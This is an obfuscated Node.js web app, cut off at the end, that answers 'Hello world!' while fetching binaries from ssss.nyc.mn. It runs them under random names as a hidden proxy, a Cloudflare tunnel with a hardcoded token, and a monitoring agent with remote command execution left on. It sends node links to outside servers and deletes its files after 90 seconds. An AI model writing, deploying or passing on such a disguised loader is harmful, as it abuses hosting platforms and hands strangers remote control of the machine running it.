function _0x3641(){const _0xa38f22=['pkill\x20-f\x20\x22[','web\x20running\x20error:\x20','automatic\x20access\x20task\x20added\x20successfully','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','taskkill\x20/f\x20/im\x20','vless','countryCode','\x20-c\x20\x22','clear','NEZHA_PORT','https+local://8.8.8.8/dns-query','existsSync','\x20is\x20created','10BpfRic','has','54QNZwPW','config.json','\x20already\x20exists','443','1352936tMzLLt','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','13qmoKbd','block','UPLOAD_URL','exec','match','railway.2221688.xyz','listen','tls','CFPORT','chmod','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','127.0.0.1','railways','nohup\x20','/config.json\x20>/dev/null\x202>&1\x20&','floor','NEZHA_KEY','map','readdirSync','fileUrl','unshift','arch','/dev/null','?encryption=none&security=tls&sni=','catch','length','random','http\x20server\x20is\x20running\x20on\x20port:','2053','win32','forEach','abcdefghijklmnopqrstuvwxyz','/api/delete-nodes','substring','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','pop','UUID','path','util','App\x20is\x20running','Skipping\x20adding\x20automatic\x20access\x20task','arm','2096','7437972FmoUNT','env','test','Subscription\x20uploaded\x20successfully','TunnelSecret','join','toString','380pakfqO','http','quic','/trojan-argo','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','base64','178SQjAij','response','PROJECT_URL','child_process','from','sub','6071290nHUCCq','tcp','&path=%2Ftrojan-argo%3Fed%3D2560#','11vXZKBD','2087','https://ipapi.co/json/','\x0aclient_secret:\x20','error','Unknown','?security=tls&sni=','https://amd64.ssss.nyc.mn/bot','ARGO_DOMAIN','isFile','Error\x20executing\x20command:\x20','ArgoDomain:','true','http://ip-api.com/json/','createWriteStream','https://oooo.serv00.net/add-url','ARGO_DOMAIN:','text/plain;\x20charset=utf-8','eyJhIjoiM2IzOWRhNjE2MDMyNTQyNjdhMzYwNTFmMWFmYzI4NjIiLCJ0IjoiNTRhY2ZkNjUtZTNjZS00ZTI5LTg2NGUtN2MwOWZjYTlkMjUzIiwicyI6Ik56UTFNemd4T1dFdFlUQmhaQzAwWWpka0xUaGhZelV0Tm1RNU9UVTNaV0V6TVRjMiJ9','/vless-argo','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','unlink','org','&path=%2Fvless-argo%3Fed%3D2560#','ARGO_PORT','4412byksBa','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x20-c\x20','direct','SUB_PATH','none','/vmess-argo','push','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','finish','data','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','basename','\x20>/dev/null\x202>&1\x20&','\x20>/dev/null\x202>&1','cdns.doon.eu.org','unlinkSync','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','del\x20/f\x20/q\x20','Error\x20in\x20startserver:','vmess','set','NEZHA_SERVER','freedom','then','/vmess-argo?ed=2560','fileName','./tmp','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','https://amd64.ssss.nyc.mn/v1','npm\x20running\x20error:\x20','false','charAt','get','.exe\x20>\x20nul\x202>&1','utf-8','success','Download\x20','all','sub.txt','axios','&fp=firefox&type=ws&host=','boot.log','\x20is\x20running','7021238POLuOb','list.txt','readFileSync','express','blackhole','post','tunnel.json','tunnel.yml','Empowerment\x20failed\x20for\x20','/api/add-subscriptions','https://arm64.ssss.nyc.mn/agent','\x0avless://','statSync','xtls-rprx-vision','PORT','23169pVyibk','8443','https://arm64.ssss.nyc.mn/v1','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','stringify','676806mAsnyr','amd','Add\x20automatic\x20access\x20task\x20faild:\x20','arm64','php\x20running\x20error:\x20','Hello\x20world!','config.yaml','2083','CFIP','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','writeFileSync','\x0a\x20\x20tunnel:\x20','filter','send','status','application/json','message','6e4d9b85-5b2a-4160-828b-a4bfe4fc58af','country_code','\x20>\x20nul\x202>&1','/tunnel.yml\x20run','pipe','split','\x0a\x20\x20\x20\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x0a\x20\x20credentials-file:\x20','log','/sub.txt\x20saved\x20successfully'];_0x3641=function(){return _0xa38f22;};return _0x3641();}const _0x13cf94=_0x430a;(function(_0x1fedb7,_0x5402fe){const _0x246c64=_0x430a,_0x43dfd1=_0x1fedb7();while(!![]){try{const _0x580280=-parseInt(_0x246c64(0x16e))/0x1*(-parseInt(_0x246c64(0x14c))/0x2)+-parseInt(_0x246c64(0x1a9))/0x3*(-parseInt(_0x246c64(0x146))/0x4)+parseInt(_0x246c64(0x1d7))/0x5*(parseInt(_0x246c64(0x1ae))/0x6)+-parseInt(_0x246c64(0x19a))/0x7+-parseInt(_0x246c64(0x1dd))/0x8*(parseInt(_0x246c64(0x1d9))/0x9)+-parseInt(_0x246c64(0x152))/0xa*(-parseInt(_0x246c64(0x155))/0xb)+parseInt(_0x246c64(0x13f))/0xc*(parseInt(_0x246c64(0x1df))/0xd);if(_0x580280===_0x5402fe)break;else _0x43dfd1['push'](_0x43dfd1['shift']());}catch(_0x411239){_0x43dfd1['push'](_0x43dfd1['shift']());}}}(_0x3641,0x8901b));const express=require(_0x13cf94(0x19d)),app=express(),axios=require(_0x13cf94(0x196)),os=require('os'),fs=require('fs'),path=require(_0x13cf94(0x139)),{promisify}=require(_0x13cf94(0x13a)),exec=promisify(require(_0x13cf94(0x14f))[_0x13cf94(0x1e2)]),{execSync}=require(_0x13cf94(0x14f)),UPLOAD_URL=process[_0x13cf94(0x140)][_0x13cf94(0x1e1)]||'',PROJECT_URL=process['env'][_0x13cf94(0x14e)]||'',AUTO_ACCESS=process[_0x13cf94(0x140)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x13cf94(0x140)]['FILE_PATH']||_0x13cf94(0x189),SUB_PATH=process[_0x13cf94(0x140)][_0x13cf94(0x172)]||_0x13cf94(0x151),PORT=process[_0x13cf94(0x140)]['SERVER_PORT']||process[_0x13cf94(0x140)][_0x13cf94(0x1a8)]||0xbb8,UUID=process[_0x13cf94(0x140)][_0x13cf94(0x138)]||_0x13cf94(0x1bf),NEZHA_SERVER=process[_0x13cf94(0x140)][_0x13cf94(0x184)]||'',NEZHA_PORT=process[_0x13cf94(0x140)][_0x13cf94(0x1d3)]||'',NEZHA_KEY=process[_0x13cf94(0x140)][_0x13cf94(0x1f0)]||'',ARGO_DOMAIN=process[_0x13cf94(0x140)][_0x13cf94(0x15d)]||_0x13cf94(0x1e4),ARGO_AUTH=process[_0x13cf94(0x140)]['ARGO_AUTH']||_0x13cf94(0x167),ARGO_PORT=process['env'][_0x13cf94(0x16d)]||0x1f41,CFIP=process['env'][_0x13cf94(0x1b6)]||_0x13cf94(0x17d),CFPORT=process[_0x13cf94(0x140)][_0x13cf94(0x1e7)]||0x1bb,NAME=process['env']['NAME']||_0x13cf94(0x1ec);function _0x430a(_0x3510b8,_0x4ed67e){_0x3510b8=_0x3510b8-0x12d;const _0x3641f2=_0x3641();let _0x430ad8=_0x3641f2[_0x3510b8];return _0x430ad8;}!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+_0x13cf94(0x1d6))):console[_0x13cf94(0x1c8)](FILE_PATH+_0x13cf94(0x1db));function generateRandomName(){const _0x4ea6d3=_0x13cf94,_0x327918=_0x4ea6d3(0x133);let _0x30db3d='';for(let _0x513e85=0x0;_0x513e85<0x6;_0x513e85++){_0x30db3d+=_0x327918[_0x4ea6d3(0x18e)](Math[_0x4ea6d3(0x1ef)](Math[_0x4ea6d3(0x12e)]()*_0x327918[_0x4ea6d3(0x12d)]));}return _0x30db3d;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x13cf94(0x144)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x13cf94(0x144)](FILE_PATH,webName),botPath=path[_0x13cf94(0x144)](FILE_PATH,botName),subPath=path[_0x13cf94(0x144)](FILE_PATH,_0x13cf94(0x195)),listPath=path[_0x13cf94(0x144)](FILE_PATH,_0x13cf94(0x19b)),bootLogPath=path[_0x13cf94(0x144)](FILE_PATH,_0x13cf94(0x198)),configPath=path[_0x13cf94(0x144)](FILE_PATH,_0x13cf94(0x1da));function deleteNodes(){const _0x364814=_0x13cf94;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x388b2d;try{_0x388b2d=fs[_0x364814(0x19c)](subPath,_0x364814(0x191));}catch{return null;}const _0x422ef2=Buffer[_0x364814(0x150)](_0x388b2d,_0x364814(0x14b))[_0x364814(0x145)](_0x364814(0x191)),_0x27ae37=_0x422ef2[_0x364814(0x1c4)]('\x0a')[_0x364814(0x1ba)](_0x3ea18e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x364814(0x141)](_0x3ea18e));if(_0x27ae37['length']===0x0)return;return axios[_0x364814(0x19f)](UPLOAD_URL+_0x364814(0x134),JSON[_0x364814(0x1ad)]({'nodes':_0x27ae37}),{'headers':{'Content-Type':'application/json'}})[_0x364814(0x1f8)](_0x500dd2=>{return null;}),null;}catch(_0x198116){return null;}}function cleanupOldFiles(){const _0x597507=_0x13cf94;try{const _0x4e6b35=fs[_0x597507(0x1f2)](FILE_PATH);_0x4e6b35[_0x597507(0x132)](_0x3b8f30=>{const _0x4893a2=_0x597507,_0x2920a1=path[_0x4893a2(0x144)](FILE_PATH,_0x3b8f30);try{const _0x480061=fs[_0x4893a2(0x1a6)](_0x2920a1);_0x480061[_0x4893a2(0x15e)]()&&fs[_0x4893a2(0x17e)](_0x2920a1);}catch(_0x119127){}});}catch(_0x498bc8){}}app['get']('/',function(_0xb24568,_0x3bdfe6){const _0x13a870=_0x13cf94;_0x3bdfe6[_0x13a870(0x1bb)](_0x13a870(0x1b3));});async function generateConfig(){const _0x5435f1=_0x13cf94,_0x1fd635={'log':{'access':_0x5435f1(0x1f6),'error':_0x5435f1(0x1f6),'loglevel':_0x5435f1(0x173)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5435f1(0x1cf),'settings':{'clients':[{'id':UUID,'flow':_0x5435f1(0x1a7)}],'decryption':_0x5435f1(0x173),'fallbacks':[{'dest':0xbb9},{'path':_0x5435f1(0x168),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x5435f1(0x149),'dest':0xbbc}]},'streamSettings':{'network':_0x5435f1(0x153)}},{'port':0xbb9,'listen':_0x5435f1(0x1eb),'protocol':_0x5435f1(0x1cf),'settings':{'clients':[{'id':UUID}],'decryption':_0x5435f1(0x173)},'streamSettings':{'network':'tcp','security':'none'}},{'port':0xbba,'listen':_0x5435f1(0x1eb),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5435f1(0x173)},'streamSettings':{'network':'ws','security':_0x5435f1(0x173),'wsSettings':{'path':_0x5435f1(0x168)}},'sniffing':{'enabled':!![],'destOverride':[_0x5435f1(0x147),_0x5435f1(0x1e6),_0x5435f1(0x148)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x5435f1(0x182),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5435f1(0x174)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5435f1(0x1e6),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5435f1(0x1eb),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5435f1(0x173),'wsSettings':{'path':_0x5435f1(0x149)}},'sniffing':{'enabled':!![],'destOverride':[_0x5435f1(0x147),_0x5435f1(0x1e6),_0x5435f1(0x148)],'metadataOnly':![]}}],'dns':{'servers':[_0x5435f1(0x1d4)]},'outbounds':[{'protocol':_0x5435f1(0x185),'tag':_0x5435f1(0x171)},{'protocol':_0x5435f1(0x19e),'tag':_0x5435f1(0x1e0)}]};fs['writeFileSync'](path['join'](FILE_PATH,'config.json'),JSON[_0x5435f1(0x1ad)](_0x1fd635,null,0x2));}function getSystemArchitecture(){const _0x10684e=_0x13cf94,_0x20a95a=os[_0x10684e(0x1f5)]();return _0x20a95a===_0x10684e(0x13d)||_0x20a95a===_0x10684e(0x1b1)||_0x20a95a==='aarch64'?_0x10684e(0x13d):_0x10684e(0x1af);}function downloadFile(_0xec2ec7,_0x6e1a1c,_0x187597){const _0x18b241=_0x13cf94,_0x5821a3=_0xec2ec7;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0xf469bb=fs[_0x18b241(0x163)](_0x5821a3);axios({'method':_0x18b241(0x18f),'url':_0x6e1a1c,'responseType':'stream'})[_0x18b241(0x186)](_0x704ce3=>{const _0x46e30a=_0x18b241;_0x704ce3[_0x46e30a(0x178)][_0x46e30a(0x1c3)](_0xf469bb),_0xf469bb['on'](_0x46e30a(0x177),()=>{const _0x1b9180=_0x46e30a;_0xf469bb['close'](),console['log'](_0x1b9180(0x193)+path[_0x1b9180(0x17a)](_0x5821a3)+'\x20successfully'),_0x187597(null,_0x5821a3);}),_0xf469bb['on'](_0x46e30a(0x159),_0x30c315=>{const _0x1e6903=_0x46e30a;fs[_0x1e6903(0x16a)](_0x5821a3,()=>{});const _0x11a76f='Download\x20'+path[_0x1e6903(0x17a)](_0x5821a3)+'\x20failed:\x20'+_0x30c315[_0x1e6903(0x1be)];console[_0x1e6903(0x159)](_0x11a76f),_0x187597(_0x11a76f);});})[_0x18b241(0x1f8)](_0x294028=>{const _0xa72e5f=_0x18b241,_0x465f64=_0xa72e5f(0x193)+path[_0xa72e5f(0x17a)](_0x5821a3)+'\x20failed:\x20'+_0x294028[_0xa72e5f(0x1be)];console[_0xa72e5f(0x159)](_0x465f64),_0x187597(_0x465f64);});}async function downloadFilesAndRun(){const _0x11c586=_0x13cf94,_0x37707f=getSystemArchitecture(),_0x3e787d=getFilesForArchitecture(_0x37707f);if(_0x3e787d['length']===0x0){console[_0x11c586(0x1c8)](_0x11c586(0x1de));return;}const _0x2a51e0=_0x3e787d[_0x11c586(0x1f1)](_0x1fcb3e=>{return new Promise((_0x3f5c8e,_0x1886cd)=>{const _0x179f5d=_0x430a;downloadFile(_0x1fcb3e[_0x179f5d(0x188)],_0x1fcb3e[_0x179f5d(0x1f3)],(_0x162e1e,_0x4ba1e3)=>{_0x162e1e?_0x1886cd(_0x162e1e):_0x3f5c8e(_0x4ba1e3);});});});try{await Promise[_0x11c586(0x194)](_0x2a51e0);}catch(_0x56e935){console[_0x11c586(0x159)]('Error\x20downloading\x20files:',_0x56e935);return;}function _0x21ca3f(_0x32edf2){const _0x2ed15f=0x1fd;_0x32edf2['forEach'](_0x4dfcdf=>{const _0x49986e=_0x430a;fs['existsSync'](_0x4dfcdf)&&fs[_0x49986e(0x1e8)](_0x4dfcdf,_0x2ed15f,_0x1ba730=>{const _0x3adbaa=_0x49986e;_0x1ba730?console[_0x3adbaa(0x159)](_0x3adbaa(0x1a2)+_0x4dfcdf+':\x20'+_0x1ba730):console[_0x3adbaa(0x1c8)]('Empowerment\x20success\x20for\x20'+_0x4dfcdf+':\x20'+_0x2ed15f[_0x3adbaa(0x145)](0x8));});});}const _0x3598cd=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x21ca3f(_0x3598cd);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x24767b=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x11c586(0x1c4)](':')[_0x11c586(0x137)]():'',_0x527d58=new Set([_0x11c586(0x1dc),_0x11c586(0x1aa),'2096',_0x11c586(0x156),_0x11c586(0x1b5),_0x11c586(0x130)]),_0x4c0911=_0x527d58[_0x11c586(0x1d8)](_0x24767b)?_0x11c586(0x161):_0x11c586(0x18d),_0x986914=_0x11c586(0x158)+NEZHA_KEY+_0x11c586(0x17f)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x4c0911+_0x11c586(0x16f)+UUID;fs[_0x11c586(0x1b8)](path[_0x11c586(0x144)](FILE_PATH,_0x11c586(0x1b4)),_0x986914);const _0x385d0f=_0x11c586(0x1ed)+phpPath+_0x11c586(0x1d1)+FILE_PATH+_0x11c586(0x1cd);try{await exec(_0x385d0f),console[_0x11c586(0x1c8)](phpName+_0x11c586(0x199)),await new Promise(_0x2d0dc7=>setTimeout(_0x2d0dc7,0x3e8));}catch(_0x27491f){console[_0x11c586(0x159)](_0x11c586(0x1b2)+_0x27491f);}}else{let _0x1a626f='';const _0x3e66e4=[_0x11c586(0x1dc),_0x11c586(0x1aa),_0x11c586(0x13e),_0x11c586(0x156),_0x11c586(0x1b5),_0x11c586(0x130)];_0x3e66e4['includes'](NEZHA_PORT)&&(_0x1a626f='--tls');const _0x116044=_0x11c586(0x1ed)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x1a626f+_0x11c586(0x179);try{await exec(_0x116044),console[_0x11c586(0x1c8)](npmName+_0x11c586(0x199)),await new Promise(_0xdaaaef=>setTimeout(_0xdaaaef,0x3e8));}catch(_0x1e7674){console['error'](_0x11c586(0x18c)+_0x1e7674);}}}else console['log']('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x5598ae=_0x11c586(0x1ed)+webPath+_0x11c586(0x170)+FILE_PATH+_0x11c586(0x1ee);try{await exec(_0x5598ae),console[_0x11c586(0x1c8)](webName+_0x11c586(0x199)),await new Promise(_0x337f34=>setTimeout(_0x337f34,0x3e8));}catch(_0x18307c){console[_0x11c586(0x159)](_0x11c586(0x1cb)+_0x18307c);}if(fs[_0x11c586(0x1d5)](botPath)){let _0x1592be;if(ARGO_AUTH[_0x11c586(0x1e3)](/^[A-Z0-9a-z=]{120,250}$/))_0x1592be=_0x11c586(0x1c6)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x1592be=_0x11c586(0x14a)+FILE_PATH+_0x11c586(0x1c2):_0x1592be='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x11c586(0x18a)+ARGO_PORT;try{await exec(_0x11c586(0x1ed)+botPath+'\x20'+_0x1592be+_0x11c586(0x17b)),console[_0x11c586(0x1c8)](botName+_0x11c586(0x199)),await new Promise(_0x418f05=>setTimeout(_0x418f05,0x7d0));}catch(_0x19a6e0){console[_0x11c586(0x159)](_0x11c586(0x15f)+_0x19a6e0);}}await new Promise(_0x449a85=>setTimeout(_0x449a85,0x1388));}function getFilesForArchitecture(_0x8852ab){const _0x47a55b=_0x13cf94;let _0x5758f5;_0x8852ab===_0x47a55b(0x13d)?_0x5758f5=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x5758f5=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x47a55b(0x15c)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x256592=_0x8852ab===_0x47a55b(0x13d)?_0x47a55b(0x1a4):'https://amd64.ssss.nyc.mn/agent';_0x5758f5[_0x47a55b(0x1f4)]({'fileName':npmPath,'fileUrl':_0x256592});}else{const _0x583a91=_0x8852ab==='arm'?_0x47a55b(0x1ab):_0x47a55b(0x18b);_0x5758f5['unshift']({'fileName':phpPath,'fileUrl':_0x583a91});}}return _0x5758f5;}function argoType(){const _0x1b1790=_0x13cf94;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1b1790(0x1c8)](_0x1b1790(0x1ea));return;}if(ARGO_AUTH['includes'](_0x1b1790(0x143))){fs[_0x1b1790(0x1b8)](path[_0x1b1790(0x144)](FILE_PATH,_0x1b1790(0x1a0)),ARGO_AUTH);const _0x2cfbac=_0x1b1790(0x1b9)+ARGO_AUTH[_0x1b1790(0x1c4)]('\x22')[0xb]+_0x1b1790(0x1c7)+path[_0x1b1790(0x144)](FILE_PATH,_0x1b1790(0x1a0))+_0x1b1790(0x169)+ARGO_DOMAIN+_0x1b1790(0x176)+ARGO_PORT+_0x1b1790(0x1ac);fs[_0x1b1790(0x1b8)](path[_0x1b1790(0x144)](FILE_PATH,_0x1b1790(0x1a1)),_0x2cfbac);}else console[_0x1b1790(0x1c8)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x25e660=_0x13cf94;let _0x18e52e;if(ARGO_AUTH&&ARGO_DOMAIN)_0x18e52e=ARGO_DOMAIN,console[_0x25e660(0x1c8)](_0x25e660(0x165),_0x18e52e),await _0x132538(_0x18e52e);else try{const _0x15bdab=fs[_0x25e660(0x19c)](path[_0x25e660(0x144)](FILE_PATH,_0x25e660(0x198)),_0x25e660(0x191)),_0x355878=_0x15bdab[_0x25e660(0x1c4)]('\x0a'),_0x57449e=[];_0x355878[_0x25e660(0x132)](_0xcd50b9=>{const _0x2d491c=_0x25e660,_0x557bf7=_0xcd50b9[_0x2d491c(0x1e3)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x557bf7){const _0x217e82=_0x557bf7[0x1];_0x57449e[_0x2d491c(0x175)](_0x217e82);}});if(_0x57449e[_0x25e660(0x12d)]>0x0)_0x18e52e=_0x57449e[0x0],console['log'](_0x25e660(0x160),_0x18e52e),await _0x132538(_0x18e52e);else{console[_0x25e660(0x1c8)](_0x25e660(0x1e9)),fs[_0x25e660(0x17e)](path[_0x25e660(0x144)](FILE_PATH,_0x25e660(0x198)));async function _0x9bbc7b(){const _0x4ccd4d=_0x25e660;try{process['platform']===_0x4ccd4d(0x131)?await exec(_0x4ccd4d(0x1ce)+botName+_0x4ccd4d(0x190)):await exec(_0x4ccd4d(0x1ca)+botName['charAt'](0x0)+']'+botName[_0x4ccd4d(0x135)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x22f4ca){}}_0x9bbc7b(),await new Promise(_0x40aa24=>setTimeout(_0x40aa24,0xbb8));const _0x1f26e5=_0x25e660(0x1b7)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x1f26e5+_0x25e660(0x17b)),console[_0x25e660(0x1c8)](botName+_0x25e660(0x199)),await new Promise(_0x1fadf4=>setTimeout(_0x1fadf4,0xbb8)),await extractDomains();}catch(_0xb685da){console['error'](_0x25e660(0x15f)+_0xb685da);}}}catch(_0x12c4a1){console[_0x25e660(0x159)]('Error\x20reading\x20boot.log:',_0x12c4a1);}async function _0x1bf027(){const _0x4c907b=_0x25e660;try{const _0x265a59=await axios['get'](_0x4c907b(0x157),{'timeout':0xbb8});if(_0x265a59[_0x4c907b(0x178)]&&_0x265a59[_0x4c907b(0x178)][_0x4c907b(0x1c0)]&&_0x265a59[_0x4c907b(0x178)][_0x4c907b(0x16b)])return _0x265a59[_0x4c907b(0x178)][_0x4c907b(0x1c0)]+'_'+_0x265a59[_0x4c907b(0x178)]['org'];}catch(_0x45ed09){try{const _0x5e6783=await axios['get'](_0x4c907b(0x162),{'timeout':0xbb8});if(_0x5e6783[_0x4c907b(0x178)]&&_0x5e6783['data'][_0x4c907b(0x1bc)]===_0x4c907b(0x192)&&_0x5e6783[_0x4c907b(0x178)][_0x4c907b(0x1d0)]&&_0x5e6783[_0x4c907b(0x178)][_0x4c907b(0x16b)])return _0x5e6783['data'][_0x4c907b(0x1d0)]+'_'+_0x5e6783[_0x4c907b(0x178)][_0x4c907b(0x16b)];}catch(_0x460e01){}}return _0x4c907b(0x15a);}async function _0x132538(_0x11ef98){const _0x5d4bce=await _0x1bf027(),_0x51ae07=NAME?NAME+'-'+_0x5d4bce:_0x5d4bce;return new Promise(_0x2c9b4e=>{setTimeout(()=>{const _0x27196b=_0x430a,_0x216c49={'v':'2','ps':''+_0x51ae07,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x27196b(0x173),'net':'ws','type':_0x27196b(0x173),'host':_0x11ef98,'path':_0x27196b(0x187),'tls':_0x27196b(0x1e6),'sni':_0x11ef98,'alpn':'','fp':'firefox'},_0x2f91fb=_0x27196b(0x1a5)+UUID+'@'+CFIP+':'+CFPORT+_0x27196b(0x1f7)+_0x11ef98+'&fp=firefox&type=ws&host='+_0x11ef98+_0x27196b(0x16c)+_0x51ae07+'\x0a\x0avmess://'+Buffer[_0x27196b(0x150)](JSON[_0x27196b(0x1ad)](_0x216c49))[_0x27196b(0x145)]('base64')+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x27196b(0x15b)+_0x11ef98+_0x27196b(0x197)+_0x11ef98+_0x27196b(0x154)+_0x51ae07+_0x27196b(0x1c5);console['log'](Buffer[_0x27196b(0x150)](_0x2f91fb)['toString']('base64')),fs['writeFileSync'](subPath,Buffer[_0x27196b(0x150)](_0x2f91fb)[_0x27196b(0x145)](_0x27196b(0x14b))),console['log'](FILE_PATH+_0x27196b(0x1c9)),uploadNodes(),app[_0x27196b(0x18f)]('/'+SUB_PATH,(_0x57f01b,_0x661025)=>{const _0x30ee85=_0x27196b,_0x3473b6=Buffer[_0x30ee85(0x150)](_0x2f91fb)['toString'](_0x30ee85(0x14b));_0x661025[_0x30ee85(0x183)]('Content-Type',_0x30ee85(0x166)),_0x661025['send'](_0x3473b6);}),_0x2c9b4e(_0x2f91fb);},0x7d0);});}}async function uploadNodes(){const _0x7068af=_0x13cf94;if(UPLOAD_URL&&PROJECT_URL){const _0x2e1b30=PROJECT_URL+'/'+SUB_PATH,_0x31e337={'subscription':[_0x2e1b30]};try{const _0x486c2a=await axios['post'](UPLOAD_URL+_0x7068af(0x1a3),_0x31e337,{'headers':{'Content-Type':_0x7068af(0x1bd)}});return _0x486c2a&&_0x486c2a[_0x7068af(0x1bc)]===0xc8?(console[_0x7068af(0x1c8)](_0x7068af(0x142)),_0x486c2a):null;}catch(_0x530d56){if(_0x530d56[_0x7068af(0x14d)]){if(_0x530d56[_0x7068af(0x14d)][_0x7068af(0x1bc)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x44ae54=fs[_0x7068af(0x19c)](listPath,_0x7068af(0x191)),_0x30e16d=_0x44ae54[_0x7068af(0x1c4)]('\x0a')[_0x7068af(0x1ba)](_0x300111=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x7068af(0x141)](_0x300111));if(_0x30e16d['length']===0x0)return;const _0x198c0e=JSON[_0x7068af(0x1ad)]({'nodes':_0x30e16d});try{const _0x30c459=await axios[_0x7068af(0x19f)](UPLOAD_URL+'/api/add-nodes',_0x198c0e,{'headers':{'Content-Type':'application/json'}});return _0x30c459&&_0x30c459[_0x7068af(0x1bc)]===0xc8?(console[_0x7068af(0x1c8)]('Nodes\x20uploaded\x20successfully'),_0x30c459):null;}catch(_0x2c8d22){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x3012dc=_0x430a,_0x5d31f0=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x5d31f0[_0x3012dc(0x175)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x5d31f0[_0x3012dc(0x175)](phpPath);process['platform']===_0x3012dc(0x131)?exec(_0x3012dc(0x180)+_0x5d31f0[_0x3012dc(0x144)]('\x20')+_0x3012dc(0x1c1),_0xecd69a=>{const _0x42f3ad=_0x3012dc;console[_0x42f3ad(0x1d2)](),console['log'](_0x42f3ad(0x13b)),console[_0x42f3ad(0x1c8)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x5d31f0[_0x3012dc(0x144)]('\x20')+_0x3012dc(0x17c),_0x448f56=>{const _0x483759=_0x3012dc;console[_0x483759(0x1d2)](),console[_0x483759(0x1c8)](_0x483759(0x13b)),console[_0x483759(0x1c8)](_0x483759(0x136));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x10a9f4=_0x13cf94;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x10a9f4(0x1c8)](_0x10a9f4(0x13c));return;}try{const _0x45df94=await axios[_0x10a9f4(0x19f)](_0x10a9f4(0x164),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x10a9f4(0x1bd)}});return console['log'](_0x10a9f4(0x1cc)),_0x45df94;}catch(_0xfbd19f){return console[_0x10a9f4(0x159)](_0x10a9f4(0x1b0)+_0xfbd19f[_0x10a9f4(0x1be)]),null;}}async function startserver(){const 